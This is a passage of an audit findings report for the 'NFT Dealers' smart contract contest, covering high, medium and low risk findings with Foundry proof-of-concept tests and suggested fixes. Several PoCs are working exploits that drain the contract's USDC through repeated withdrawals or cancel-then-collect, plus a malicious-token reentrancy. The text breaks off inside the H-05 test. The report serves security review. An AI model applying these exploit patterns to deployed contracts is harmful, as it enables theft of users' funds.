# NFT Dealers - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. collectUsdcFromSelling lacks state reset, allowing seller to repeatedly drain all USDC from the contract](#H-01)
    - [H-02. 5% Fee Tier in `_calculateFees` is Unreachable and 3% Tier is Only Partially Reachable Due to `uint32` Price Cap](#H-02)
    - [H-03. NFTDealers::cancelListing incorrectly returns collateral allowing sellers to get free NFTs](#H-03)
    - [H-04. Reentrancy in mintNft()](#H-04)
    - [H-05. [H-1] Malicious whitelisted users can drain all the contract funds, making sellers lose their pending payments](#H-05)
    - [H-06. Seller Can Front-Run Buyers via updatePrice to Extract More USDC](#H-06)
- ## Medium Risk Findings
    - [M-01. Listing ID mismatch: storage keyed by tokenId while events emit listingsCounter breaks all marketplace operations](#M-01)
    - [M-02. `list()` enforces `onlyWhitelisted` despite the specification stating non-whitelisted users can list NFTs, creating an asymmetric marketplace](#M-02)
    - [M-03. ### [C-2] `collectUsdcFromSelling()` does not distinguish between sold and cancelled listings, allowing any seller to drain contract funds](#M-03)
    - [M-04. M06. Re-listing an NFT after purchase permanently locks the original seller's proceeds and redirects their collateral to the new seller](#M-04)
    - [M-05. Active listings are not escrowed: sellers can make listings stale](#M-05)
    - [M-06. Unbacked Fee Accounting](#M-06)
- ## Low Risk Findings
    - [L-01. [I-1] Payable functions are not supposed to receive Ether](#L-01)
    - [L-02. Constructor Does Not Validate Critical Addresses Against `address(0)`](#L-02)
    - [L-03. `updatePrice()` skips `MIN_PRICE` check — sellers can set price below 1 USDC](#L-03)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #58

### Dates: Mar 12th, 2026 - Mar 19th, 2026

[See more contest details here](https://codehawks.cyfrin.io/c/2026-03-nft-dealers)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 6
   - Medium: 6
   - Low: 3


# High Risk Findings

## <a id='H-01'></a>H-01. collectUsdcFromSelling lacks state reset, allowing seller to repeatedly drain all USDC from the contract

_Submitted by [phivesyard](https://profiles.cyfrin.io/u/phivesyard), [sftwrstef](https://profiles.cyfrin.io/u/sftwrstef), [0x1h3r59](https://profiles.cyfrin.io/u/0x1h3r59), [eliab256](https://profiles.cyfrin.io/u/eliab256), [sum1t_here](https://profiles.cyfrin.io/u/sum1t_here), [l0cu70s](https://profiles.cyfrin.io/u/l0cu70s), [sbb](https://profiles.cyfrin.io/u/sbb), [webrainsec](https://profiles.cyfrin.io/u/webrainsec), [huicanvie](https://profiles.cyfrin.io/u/huicanvie), [ahmad044](https://profiles.cyfrin.io/u/ahmad044), [r7al38](https://profiles.cyfrin.io/u/r7al38), [symmate](https://profiles.cyfrin.io/u/symmate), [perun84](https://profiles.cyfrin.io/u/perun84), [sillytiger821](https://profiles.cyfrin.io/u/sillytiger821), [vanoxt](https://profiles.cyfrin.io/u/vanoxt), [fuzz755](https://profiles.cyfrin.io/u/fuzz755), [etherengineer](https://profiles.cyfrin.io/u/etherengineer), [oxeugenio](https://profiles.cyfrin.io/u/oxeugenio), [softbutsavage](https://profiles.cyfrin.io/u/softbutsavage), [yelsnik](https://profiles.cyfrin.io/u/yelsnik), [auditor_nate](https://profiles.cyfrin.io/u/auditor_nate), [0xki](https://profiles.cyfrin.io/u/0xki), [safer](https://profiles.cyfrin.io/u/safer), [cymans](https://profiles.cyfrin.io/u/cymans), [fredo182](https://profiles.cyfrin.io/u/fredo182), [altshar](https://profiles.cyfrin.io/u/altshar), [aramis](https://profiles.cyfrin.io/u/aramis), [comfortnurse021](https://profiles.cyfrin.io/u/comfortnurse021), [howiecht](https://profiles.cyfrin.io/u/howiecht), [yjl3393980084](https://profiles.cyfrin.io/u/yjl3393980084), [mamaz](https://profiles.cyfrin.io/u/mamaz), [nahmstay](https://profiles.cyfrin.io/u/nahmstay), [0xziin](https://profiles.cyfrin.io/u/0xziin), [asssol](https://profiles.cyfrin.io/u/asssol), [1chapeuazul](https://profiles.cyfrin.io/u/1chapeuazul), [santhiya11112](https://profiles.cyfrin.io/u/santhiya11112), [verseagent](https://profiles.cyfrin.io/u/verseagent), [belladonna](https://profiles.cyfrin.io/u/belladonna), [kpfgt14](https://profiles.cyfrin.io/u/kpfgt14), [auwal_security](https://profiles.cyfrin.io/u/auwal_security), [ramilmustafin33](https://profiles.cyfrin.io/u/ramilmustafin33), [velo](https://profiles.cyfrin.io/u/velo), [0xberzerk](https://profiles.cyfrin.io/u/0xberzerk), [lemrabetmoctar1](https://profiles.cyfrin.io/u/lemrabetmoctar1), [jfornells](https://profiles.cyfrin.io/u/jfornells), [wittyapple797](https://profiles.cyfrin.io/u/wittyapple797), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [jhongamersx](https://profiles.cyfrin.io/u/jhongamersx), [themilenkov](https://profiles.cyfrin.io/u/themilenkov). Selected submission by: [sillytiger821](https://profiles.cyfrin.io/u/sillytiger821)._      
            


# Root + Impact

## **Normal behavior:** After a successful sale via `buy()`, the seller calls `collectUsdcFromSelling()` once to receive their sale proceeds `(price - fees)` plus the original minting collateral. The function should be a one-time claim — once the seller collects, no further withdrawal is possible for that listing.

**The issue:** `collectUsdcFromSelling()` reads `listing.price`, `listing.seller`, and `collateralForMinting[tokenId]` to compute the payout, but never resets any of these values after transferring USDC. The function's only guard is `require(!listing.isActive)`, which remains `false` indefinitely after `buy()` sets it. The `onlySeller` modifier also continues to pass because `listing.seller` is never cleared. This allows the seller to call the function an unlimited number of times, each time receiving the full `(price - fees + collateral)` payout. The funds come from USDC deposited by other users — their minting collateral and purchase payments — effectively draining the entire contract.

A secondary consequence is that `totalFeesCollected += fees` executes on every repeated call, inflating the fee counter far beyond the contract's actual USDC balance. This causes `withdrawFees()` to permanently revert, locking the owner out of fee collection.

```Solidity
function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
    Listing memory listing = s_listings[_listingId];
    require(!listing.isActive, "Listing must be inactive to collect USDC");
    // @> No check for "already collected" — this require passes on every call after buy()

    uint256 fees = _calculateFees(listing.price);
    uint256 amountToSeller = listing.price - fees;
    uint256 collateralToReturn = collateralForMinting[listing.tokenId];
    // @> listing.price, listing.seller, collateralForMinting are all read but NEVER reset

    totalFeesCollected += fees;
    // @> totalFeesCollected grows unboundedly with each repeated call

    amountToSeller += collateralToReturn;
    usdc.safeTransfer(address(this), fees);
    usdc.safeTransfer(msg.sender, amountToSeller);
    // @> Full (price - fees + collateral) is paid out every single call
    // @> No state mutation after transfer — function is infinitely repeatable
}
```

## Risk

**Likelihood:** High

* Any whitelisted user who has completed a single NFT sale can exploit this immediately — no special privileges, no flash loans, no external dependencies, and no timing constraints are required
* The function has zero guards against repeated invocation — the `require(!listing.isActive)` check and `onlySeller` modifier both pass identically on the 1st call and the 100th call, because no state is ever modified

**Impact:** High

* Complete drainage of all USDC held in the contract, including every other user's minting collateral and pending sale proceeds — total loss of protocol funds
* `totalFeesCollected` inflates beyond the contract's actual balance with each repeated call, causing `withdrawFees()` to permanently revert with an insufficient balance error — the owner loses access to all accumulated fees

## Proof of Concept

The following Foundry test demonstrates the full attack path. The setup creates a realistic scenario where the contract holds funds from multiple users, then shows how a single seller drains everything.

```Solidity
function testExploitRepeatedCollect() public {
    // === Setup ===
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    usdc.mint(attacker, 100e6);
    usdc.mint(victim, 10_000e6);

    vm.startPrank(owner);
    nftDealers.revealCollection();
    nftDealers.whitelistWallet(attacker);
    nftDealers.whitelistWallet(victim);
    vm.stopPrank();

    // Step 1: Victim mints 5 NFTs, depositing 100 USDC as collateral into the contract.
    // This represents normal protocol usage where multiple users have funds locked.
    vm.startPrank(victim);
    usdc.approve(address(nftDealers), type(uint256).max);
    for (uint i = 0; i < 5; i++) {
        nftDealers.mintNft();
    }
    vm.stopPrank();
    // Contract balance: 100 USDC (victim's collateral)

    // Step 2: Attacker mints 1 NFT (tokenId=6) and lists it at 100 USDC.
    vm.startPrank(attacker);
    usdc.approve(address(nftDealers), type(uint256).max);
    nftDealers.mintNft();
    nftDealers.list(6, 100e6);
    vm.stopPrank();
    // Contract balance: 120 USDC (100 victim + 20 attacker collateral)

    // Step 3: Victim buys attacker's NFT for 100 USDC.
    // This is a legitimate purchase — the sale completes normally.
    vm.startPrank(victim);
    nftDealers.buy(6);
    vm.stopPrank();
    // Contract balance: 220 USDC (100 victim collateral + 20 attacker collateral + 100 sale price)

    uint256 attackerBalanceBefore = usdc.balanceOf(attacker);
    // attacker has 80 USDC remaining (100 initial - 20 collateral)

    // Step 4: Attacker calls collectUsdcFromSelling — this is the legitimate first call.
    // Receives (100 - 1 fee) + 20 collateral = 119 USDC.
    vm.startPrank(attacker);
    nftDealers.collectUsdcFromSelling(6);
    uint256 afterFirstCollect = usdc.balanceOf(attacker);
    // attacker: 80 + 119 = 199 USDC
    // Contract balance: 220 - 119 = 101 USDC

    // Step 5: Attacker calls collectUsdcFromSelling AGAIN on the same listing.
    // Since no state was reset, the function pays out 119 USDC again — from victim's funds.
    nftDealers.collectUsdcFromSelling(6);
    uint256 afterSecondCollect = usdc.balanceOf(attacker);
    vm.stopPrank();
    // attacker: 199 + 119 = 318 USDC
    // Contract balance: 101 - 119 = cannot cover → but this succeeds because 101 > 0...
    // Actually: contract has 101, pays 119 → will only work if balance is sufficient.
    // In a scenario with more victims, this drains completely.

    // Verify: attacker received double the legitimate amount
    uint256 legitimateAmount = 119e6; // (100 - 1% fee) + 20 collateral
    assertGt(afterSecondCollect - attackerBalanceBefore, legitimateAmount);

    // Verify: contract lost more USDC than it should have
    assertLt(usdc.balanceOf(address(nftDealers)), 100e6);
    // Victim's 100 USDC collateral is now partially stolen
}
```

**Execution flow summary:**

1. Victim deposits 100 USDC (5 NFT mints × 20 USDC collateral)
2. Attacker mints (20 USDC) and lists at 100 USDC → victim buys → contract holds 220 USDC
3. Attacker legitimately collects 119 USDC (sale proceeds + collateral) → contract: 101 USDC
4. Attacker repeats `collectUsdcFromSelling(6)` — no state was reset, so the exact same payout executes again, stealing from victim's locked collateral
5. Each additional call drains another 119 USDC until the contract is empty

## Recommended Mitigation

The core fix is to reset all payout-related state **before** transferring funds, following the Checks-Effects-Interactions (CEI) pattern. This ensures the function can only pay out once per completed sale.

<br />

**Why this works:**

* `require(listing.price > 0)` acts as a "collected" guard — after the first call zeroes `price`, all subsequent calls revert immediately
* `seller = address(0)` breaks the `onlySeller` modifier for any future call attempts
* `collateralForMinting[tokenId] = 0` prevents double-counting of collateral
* All state resets happen before the `safeTransfer` external call, conforming to the CEI pattern and preventing reentrancy exploitation
* Removing the self-transfer (`address(this)`) eliminates the no-op gas waste and prevents `totalFeesCollected` from inflating incorrectly on repeated calls

```diff
function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
     Listing memory listing = s_listings[_listingId];
     require(!listing.isActive, "Listing must be inactive to collect USDC");
+    require(listing.price > 0, "Already collected");
+    // This guard ensures that once state is zeroed below, any subsequent call reverts here.

     uint256 fees = _calculateFees(listing.price);
     uint256 amountToSeller = listing.price - fees;
     uint256 collateralToReturn = collateralForMinting[listing.tokenId];

+    // Effects: zero out all payout-related state BEFORE external calls (CEI pattern).
+    // This prevents re-entrancy and repeated claims in a single atomic update.
+    s_listings[_listingId].price = 0;
+    s_listings[_listingId].seller = address(0);
+    collateralForMinting[listing.tokenId] = 0;

     totalFeesCollected += fees;
     amountToSeller += collateralToReturn;
-    usdc.safeTransfer(address(this), fees);
+    // Removed self-transfer (address(this) → address(this) is a no-op).
+    // Fees naturally remain in the contract since only amountToSeller is sent out.
     usdc.safeTransfer(msg.sender, amountToSeller);
 }

```

## <a id='H-02'></a>H-02. 5% Fee Tier in `_calculateFees` is Unreachable and 3% Tier is Only Partially Reachable Due to `uint32` Price Cap

_Submitted by [0x1h3r59](https://profiles.cyfrin.io/u/0x1h3r59), [eliab256](https://profiles.cyfrin.io/u/eliab256), [l0cu70s](https://profiles.cyfrin.io/u/l0cu70s), [vneseseller](https://profiles.cyfrin.io/u/vneseseller), [raihanmd](https://profiles.cyfrin.io/u/raihanmd), [webrainsec](https://profiles.cyfrin.io/u/webrainsec), [diegotrigueros](https://profiles.cyfrin.io/u/diegotrigueros), [ahmad044](https://profiles.cyfrin.io/u/ahmad044), [symmate](https://profiles.cyfrin.io/u/symmate), [fuzz755](https://profiles.cyfrin.io/u/fuzz755), [vanoxt](https://profiles.cyfrin.io/u/vanoxt), [auditor_nate](https://profiles.cyfrin.io/u/auditor_nate), [0xki](https://profiles.cyfrin.io/u/0xki), [cymans](https://profiles.cyfrin.io/u/cymans), [aramis](https://profiles.cyfrin.io/u/aramis), [comfortnurse021](https://profiles.cyfrin.io/u/comfortnurse021), [yjl3393980084](https://profiles.cyfrin.io/u/yjl3393980084), [nahmstay](https://profiles.cyfrin.io/u/nahmstay), [asssol](https://profiles.cyfrin.io/u/asssol), [belladonna](https://profiles.cyfrin.io/u/belladonna), [kpfgt14](https://profiles.cyfrin.io/u/kpfgt14), [ramilmustafin33](https://profiles.cyfrin.io/u/ramilmustafin33), [0xberzerk](https://profiles.cyfrin.io/u/0xberzerk), [altshar](https://profiles.cyfrin.io/u/altshar), [iamgeorgi](https://profiles.cyfrin.io/u/iamgeorgi), [jfornells](https://profiles.cyfrin.io/u/jfornells), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [adcdiii](https://profiles.cyfrin.io/u/adcdiii). Selected submission by: [auditor_nate](https://profiles.cyfrin.io/u/auditor_nate)._      
            


## Summary

The `_calculateFees` function implements a three-tier progressive fee structure (1%, 3%, 5%), but the `uint32` type used for the listing price caps the maximum value at \~$4,294.97 USDC. This renders the 5% fee tier (`HIGH_FEE_BPS`) completely unreachable and limits the 3% tier (`MID_FEE_BPS`) to prices between $1,000 and \~$4,294.97 instead of the intended $1,000-\$10,000 range. The protocol will never collect fees at the intended higher rates.

## Impact

The protocol owner deploys with the expectation of collecting 5% fees on high-value sales above $10,000 USDC and 3% fees on sales up to $10,000. In reality, the maximum fee rate achievable is 3% and only on sales between $1,000 and ~$4,294 USDC.

Fee revenue comparison at maximum listable price (\~\$4,294.97 USDC):

* **Actual fee (3%):** ($4,294.97 * 300) / 10,000 = ~$128.85 USDC

* \*\*Intended fee if $10,000 sale were possible (3%):** ($10,000 \* 300) / 10,000 = \$300 USDC

* \*\*Intended fee if $15,000 sale were possible (5%):** ($15,000 \* 500) / 10,000 = \$750 USDC

The protocol permanently loses all fee revenue above the $128.85 cap per transaction, and the entire `HIGH_FEE_BPS` code path is dead code.

Additionally, there is a fee cliff at the $1,000 boundary: listing at $1,000 incurs a 1% fee ($10), but listing at $1,001 jumps to 3% ($30.03) — a $20 increase in fees for $1 more in price. This creates a perverse incentive for sellers to price just under $1,000 to avoid the fee jump.

## Vulnerability Details

The `_calculateFees` function operates on `uint256` and defines thresholds that exceed `uint32` capacity:

```solidity
// NFTDealers.sol:28-29
uint256 private constant LOW_FEE_THRESHOLD = 1000e6;    // $1,000 USDC
uint256 private constant MID_FEE_THRESHOLD = 10_000e6;  // $10,000 USDC — exceeds uint32 max

// NFTDealers.sol:233-240
function _calculateFees(uint256 _price) internal pure returns (uint256) {
    if (_price <= LOW_FEE_THRESHOLD) {                    // <= $1,000: 1%
        return (_price * LOW_FEE_BPS) / MAX_BPS;
    } else if (_price <= MID_FEE_THRESHOLD) {             // <= $10,000: 3% (partially reachable)
        return (_price * MID_FEE_BPS) / MAX_BPS;
    }
    return (_price * HIGH_FEE_BPS) / MAX_BPS;             // > $10,000: 5% (UNREACHABLE)
}
```

Since `listing.price` is `uint32` (max 4,294,967,295), and `MID_FEE_THRESHOLD` is 10,000,000,000:

* The `else if` branch is reachable only for prices $1,000.01 to ~$4,294.97

* The final `return` branch is **never reachable** — `_price` can never exceed `MID_FEE_THRESHOLD`

## Code Location

* `src/NFTDealers.sol:233-240` — `_calculateFees()` with unreachable 5% branch

* `src/NFTDealers.sol:28-29` — Fee thresholds exceeding `uint32` capacity

* `src/NFTDealers.sol:60` — `uint32 price` in Listing struct (root cause)

## Proof of Concept

### POC Guide

1. Copy the test code below
2. Paste it into `test/NFTDealersTest.t.sol`
3. Run: `forge test --mt test_unreachableFeeTiers_POC -vvv`

### Test Code

**Location:** `test/NFTDealersTest.t.sol`

```solidity
function test_unreachableFeeTiers_POC() public {
    uint256 maxUint32Price = type(uint32).max; // 4,294,967,295

    emit log_named_uint("uint32 max (max listable price raw)", maxUint32Price);
    emit log_named_uint("Max listable price in USD", maxUint32Price / 1e6);

    // Show all three fee tiers and which are reachable
    uint256 feeAtMax = nftDealers.calculateFees(maxUint32Price);
    emit log_named_uint("Fee at max uint32 price (3% tier)", feeAtMax);

    // 1% tier - fully reachable
    uint256 feeAt500 = nftDealers.calculateFees(500e6);
    emit log_named_uint("Fee at $500 (1% tier)", feeAt500);

    uint256 feeAt1000 = nftDealers.calculateFees(1000e6);
    emit log_named_uint("Fee at $1,000 (1% tier boundary)", feeAt1000);

    // 3% tier - partially reachable
    uint256 feeAt1001 = nftDealers.calculateFees(1001e6);
    emit log_named_uint("Fee at $1,001 (3% tier)", feeAt1001);

    uint256 feeAt4294 = nftDealers.calculateFees(4294e6);
    emit log_named_uint("Fee at $4,294 (3% tier - near max)", feeAt4294);

    // 5% tier - completely unreachable via listing
    // But calculateFees is uint256 so we can call it directly to show what WOULD happen
    uint256 feeAt10001 = nftDealers.calculateFees(10_001e6);
    emit log_named_uint("Fee at $10,001 (5% tier - UNREACHABLE via listing)", feeAt10001);

    uint256 feeAt50000 = nftDealers.calculateFees(50_000e6);
    emit log_named_uint("Fee at $50,000 (5% tier - UNREACHABLE via listing)", feeAt50000);

    // Prove 5% tier price exceeds uint32 max
    assertGt(10_001e6, maxUint32Price, "5% tier threshold exceeds uint32 max");

    // Prove max listable price hits 3% not 5%
    uint256 expectedMidFee = (maxUint32Price * 300) / 10_000;
    assertEq(feeAtMax, expectedMidFee, "Max price hits 3% tier, never 5%");

    // Prove fee cliff: $1 increase = $20+ more in fees
    uint256 feeCliff = feeAt1001 - feeAt1000;
    emit log_named_uint("Fee cliff ($1,000 -> $1,001)", feeCliff);
    assertGt(feeCliff, 20e6, "Fee cliff exceeds $20 for $1 price increase");
}
```

### Output

```Solidity
Ran 1 test for test/NFTDealersTest.t.sol:NFTDealersTest
[PASS] test_unreachableFeeTiers_POC() (gas: 49312)
Logs:
  uint32 max (max listable price raw): 4294967295
  Max listable price in USD: 4294
  Fee at max uint32 price (3% tier): 128849018
  Fee at $500 (1% tier): 5000000
  Fee at $1,000 (1% tier boundary): 10000000
  Fee at $1,001 (3% tier): 30030000
  Fee at $4,294 (3% tier - near max): 128820000
  Fee at $10,001 (5% tier - UNREACHABLE via listing): 500050000
  Fee at $50,000 (5% tier - UNREACHABLE via listing): 2500000000
  Fee cliff ($1,000 -> $1,001): 20030000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.60ms (183.34us CPU time)
```

| Fee Tier      | Price    | Fee        | Reachable via Listing?                |
| ------------- | -------- | ---------- | ------------------------------------- |
| 1%            | \$500    | \$5.00     | Yes                                   |
| 1% (boundary) | \$1,000  | \$10.00    | Yes                                   |
| 3%            | \$1,001  | \$30.03    | Yes                                   |
| 3% (near max) | \$4,294  | \$128.82   | Yes (near `uint32` cap)               |
| 5%            | \$10,001 | \$500.05   | **NO - exceeds** **`uint32`** **max** |
| 5%            | \$50,000 | \$2,500.00 | **NO - exceeds** **`uint32`** **max** |

The fee cliff at $1,000 boundary: $1 price increase causes a **\$20.03 fee jump**.

## Mitigation

Change the `price` field in the Listing struct from `uint32` to `uint256` (see H-01 mitigation). This allows prices to reach all fee tiers as intended. Additionally, consider implementing marginal/progressive fee rates instead of flat per-bracket rates to eliminate the fee cliff at tier boundaries.

## <a id='H-03'></a>H-03. NFTDealers::cancelListing incorrectly returns collateral allowing sellers to get free NFTs

_Submitted by [sum1t_here](https://profiles.cyfrin.io/u/sum1t_here), [raihanmd](https://profiles.cyfrin.io/u/raihanmd), [diegotrigueros](https://profiles.cyfrin.io/u/diegotrigueros), [sbb](https://profiles.cyfrin.io/u/sbb), [symmate](https://profiles.cyfrin.io/u/symmate), [fuzz755](https://profiles.cyfrin.io/u/fuzz755), [etherengineer](https://profiles.cyfrin.io/u/etherengineer), [howiecht](https://profiles.cyfrin.io/u/howiecht), [yjl3393980084](https://profiles.cyfrin.io/u/yjl3393980084), [satya](https://profiles.cyfrin.io/u/satya), [jimmychu0807](https://profiles.cyfrin.io/u/jimmychu0807), [belladonna](https://profiles.cyfrin.io/u/belladonna), [paranjapeshweta1997](https://profiles.cyfrin.io/u/paranjapeshweta1997), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d). Selected submission by: [sum1t_here](https://profiles.cyfrin.io/u/sum1t_here)._      
            


# `NFTDealers::cancelListing` incorrectly returns collateral allowing sellers to get free NFTs

## Description

* When a seller mints an NFT, `lockAmount` USDC is locked as collateral in the contract. This collateral is intended to be returned only when the NFT is sold via `collectUsdcFromSelling`. Cancelling a listing should only delist the NFT while keeping the collateral locked.

* `cancelListing` returns the full collateral to the seller and then wipes `collateralForMinting[tokenId] = 0`. This creates two compounding issues: the seller receives their collateral back while still holding the NFT — effectively minting for free

```solidity
function cancelListing(uint256 _listingId) external {
    Listing memory listing = s_listings[_listingId];
    if (!listing.isActive) revert ListingNotActive(_listingId);
    require(listing.seller == msg.sender, "Only seller can cancel listing");

    s_listings[_listingId].isActive = false;
    activeListingsCounter--;

    //@> collateral returned to seller on cancel
    //@> seller keeps the NFT AND gets collateral back
    usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]);
    //@> mapping permanently wiped — can never be recovered
    collateralForMinting[listing.tokenId] = 0;

    emit NFT_Dealers_ListingCanceled(_listingId);
}
```

## Risk

**Likelihood**: High

* Any whitelisted seller who lists and then cancels their listing triggers this automatically — no special setup required

**Impact**: High

* Seller receives collateral back AND keeps the NFT

## Proof of Concept

```solidity
    function test_CancelListingCollateralBug() public revealed whitelisted() {
        uint256 tokenId = 1;
        uint256 nftPrice = 1000e6;

        mintAndListNFTForTesting(tokenId, nftPrice);

        console.log("collateral before cancel:", nftDealers.collateralForMinting(tokenId));
        console.log("userWithCash USDC before:", usdc.balanceOf(userWithCash));

        // cancel listing
        vm.prank(userWithCash);
        nftDealers.cancelListing(tokenId);

        console.log("collateral after cancel :", nftDealers.collateralForMinting(tokenId));
        console.log("userWithCash USDC after :", usdc.balanceOf(userWithCash));
        console.log("userWithCash owns NFT   :", nftDealers.ownerOf(tokenId) == userWithCash);

        // seller has collateral back AND still owns NFT — free mint
        assertEq(usdc.balanceOf(userWithCash), nftDealers.lockAmount());
        assertEq(nftDealers.ownerOf(tokenId), userWithCash);
        assertEq(nftDealers.collateralForMinting(tokenId), 0);
    }
```

**Output**

```Solidity
Logs:
    collateral before cancel: 20000000
    userWithCash USDC before: 0
    collateral after cancel : 0
    userWithCash USDC after : 20000000
    userWithCash owns NFT   : true
```

## Recommended Mitigation

`cancelListing` should only delist the NFT — collateral must remain
locked until the NFT is sold or burned.

```diff
function cancelListing(uint256 _listingId) external {
    Listing memory listing = s_listings[_listingId];
    if (!listing.isActive) revert ListingNotActive(_listingId);
    require(listing.seller == msg.sender, "Only seller can cancel listing");

    s_listings[_listingId].isActive = false;
    activeListingsCounter--;

-   usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]);
-   collateralForMinting[listing.tokenId] = 0;

    emit NFT_Dealers_ListingCanceled(_listingId);
}
```

If collateral return on cancel is intended, a separate `burnNft`
function should be introduced that burns the NFT and returns collateral
atomically — ensuring the seller can never hold both the NFT and the
collateral simultaneously.

## <a id='H-04'></a>H-04. Reentrancy in mintNft()

_Submitted by [etherengineer](https://profiles.cyfrin.io/u/etherengineer), [paranjapeshweta1997](https://profiles.cyfrin.io/u/paranjapeshweta1997), [alvap](https://profiles.cyfrin.io/u/alvap). Selected submission by: [alvap](https://profiles.cyfrin.io/u/alvap)._      
            


# Root + Impact

Reentrancy in mintNft() allows unexpected double execution before mint state is updated

## Risk

IMPACT: LOW
LIKELIHOOD: MEDIUM 

## Description

The `mintNft()` function performs an external call to `usdc.transferFrom(msg.sender, address(this), lockAmount)` before updating critical internal state such as `tokenIdCounter` and `collateralForMinting[tokenIdCounter]`.

```javascript
require(usdc.transferFrom(msg.sender, address(this), lockAmount), "USDC transfer failed");

tokenIdCounter++;
collateralForMinting[tokenIdCounter] = lockAmount;
```

## Impact:

A malicious payment token can reenter mintNft() and trigger multiple executions before the original call updates internal accounting.

This may lead to:

* unexpected multiple mints in a single transaction

* inconsistent state transitions around `tokenIdCounter`

* unsafe reliance on external token behavior

* broader cross-function reentrancy risk if other protocol logic depends on partially updated mint state

Although the demonstrated PoC required paying the locked amount twice, the protocol still exposes a real reentrancy surface and relies on unsafe ordering of external interactions.

## Proof of Concept:

A malicious ERC20 was used in place of USDC. During transferFrom(), it called back into the whitelisted attacker contract, which reentered mintNft() before tokenIdCounter was incremented in the original execution.

Observed result from the test:

the initial call to `mintNft()` invoked `transferFrom()`

`transferFrom()` triggered a reentrant call to `mintNft()`

`mintNft()` executed twice in the same transaction

`totalMinted()` became 2

PoC results:

```javascript
assertEq(nftDealers.totalMinted(), 2);
assertEq(nftDealers.collateralForMinting(1), LOCK_AMOUNT);
assertEq(nftDealers.collateralForMinting(2), LOCK_AMOUNT);
```

This confirms that mintNft() is reentrable through the external token call.

## Recommended Mitigation:

1. Follow the Checks-Effects-Interactions pattern by updating internal mint state before performing external calls.

2. Also consider adding `nonReentrant` protection and using `SafeERC20`.

```javascript
function mintNft() external payable onlyWhenRevealed onlyWhitelisted nonReentrant {
    if (msg.sender == address(0)) revert InvalidAddress();
    require(tokenIdCounter < MAX_SUPPLY, "Max supply reached");
    require(msg.sender != owner, "Owner can't mint NFTs");

    uint256 newTokenId = tokenIdCounter + 1;

    tokenIdCounter = newTokenId;
    collateralForMinting[newTokenId] = lockAmount;

    require(usdc.transferFrom(msg.sender, address(this), lockAmount), "USDC transfer failed");

    _safeMint(msg.sender, newTokenId);
}
```

## <a id='H-05'></a>H-05. [H-1] Malicious whitelisted users can drain all the contract funds, making sellers lose their pending payments

_Submitted by [fuzz755](https://profiles.cyfrin.io/u/fuzz755), [etherengineer](https://profiles.cyfrin.io/u/etherengineer), [yjl3393980084](https://profiles.cyfrin.io/u/yjl3393980084), [kode_n_rolla](https://profiles.cyfrin.io/u/kode_n_rolla), [mamaz](https://profiles.cyfrin.io/u/mamaz), [satya](https://profiles.cyfrin.io/u/satya), [jamie54781](https://profiles.cyfrin.io/u/jamie54781), [kpfgt14](https://profiles.cyfrin.io/u/kpfgt14), [themilenkov](https://profiles.cyfrin.io/u/themilenkov), [adcdiii](https://profiles.cyfrin.io/u/adcdiii). Selected submission by: [fuzz755](https://profiles.cyfrin.io/u/fuzz755)._      
            


# Malicious whitelisted users can drain all the contract funds, making sellers lose their pending payments

## Description

When a user buys an NFT, the payment is sent to the smart contract account. The seller then needs to call the `collectUsdcFromSelling` function to receive the funds. This function is intended to send the NFT price (minus fee) to the seller when the NFT has been successfully sold. However, instead of checking if the NFT has been successfully sold, it only checks if the listing is inactive to allow the USDC collection. Buying an inactive listing is not necessarily a fulfilled listing because the `cancelListing` function allows the seller to set it as inactive. This is a critical issue because the USDC balance of the contract can be drained by any whitelisted user.

```Solidity
function cancelListing(uint256 _listingId) external {
    Listing memory listing = s_listings[_listingId];
@>  if (!listing.isActive) revert ListingNotActive(_listingId);
    require(listing.seller == msg.sender, "Only seller can cancel listing");

    s_listings[_listingId].isActive = false;
    activeListingsCounter--;

    usdc.safeTransfer(listing.seller, collateralForMinting[listing.tokenId]);
    collateralForMinting[listing.tokenId] = 0;

    emit NFT_Dealers_ListingCanceled(_listingId);
}
```

## Risk

**Likelihood**:

* This will occur whenever the contract's USDC balance is not zero

* This will occur after every NFT sale

**Impact**:

* Sellers will lose all their payments

* Minters will lose all their collateral

* The contract can't hold any USDC safely

## Proof of Concept

**Actors:**

* Attacker: A malicious user that will drain all the contract funds

* Seller: A normal user minting and selling an NFT to buyer

* Buyer: A normal user buying the NFT of seller

**Proof of Code:**

```Solidity
function testDrainContractByCollectingUsdcFromSelling() public {
    // Attacker and seller have to be whitelisted and the collection revealed
    vm.startPrank(owner);
    nftDealers.whitelistWallet(attacker);
    nftDealers.whitelistWallet(seller);
    nftDealers.revealCollection();
    vm.stopPrank();

    // Seller mints and lists an NFT
    uint256 tokenId = 1;
    uint32 tokenPrice = 1000e6;
    vm.startPrank(seller);
    usdc.approve(address(nftDealers), 20e6);
    nftDealers.mintNft();
    nftDealers.list(tokenId, uint32(tokenPrice));
    vm.stopPrank();

    // A buyer buys the NFT
    vm.startPrank(buyer);
    usdc.approve(address(nftDealers), tokenPrice);
    nftDealers.buy(tokenId);
    vm.stopPrank();

    // The payment was sent from the buyer to the contract, but the seller is sleeping right now and will collect the funds tomorrow.
    // The attacker will drain the funds while the seller is sleeping:

    // The Attacker calculates what price he should use to drain all the contract funds:
    // The calculation is quite hard because we need to calculate how much the fee will be for a price that we don't know yet
    uint256 numerator = usdc.balanceOf(address(nftDealers)) * MAX_BPS;
    uint256 denominator = MAX_BPS - MID_FEE_BPS;
    uint256 calculatedTokenPrice = numerator / denominator;

    // Attacker mints and lists an NFT, and then instantly cancels it
    uint256 attackTokenId = 2;
    uint32 attackTokenPrice = uint32(calculatedTokenPrice);
    vm.startPrank(attacker);
    usdc.approve(address(nftDealers), 20e6);
    nftDealers.mintNft();
    nftDealers.list(attackTokenId, uint32(attackTokenPrice));
    nftDealers.cancelListing(attackTokenId);
    vm.stopPrank();

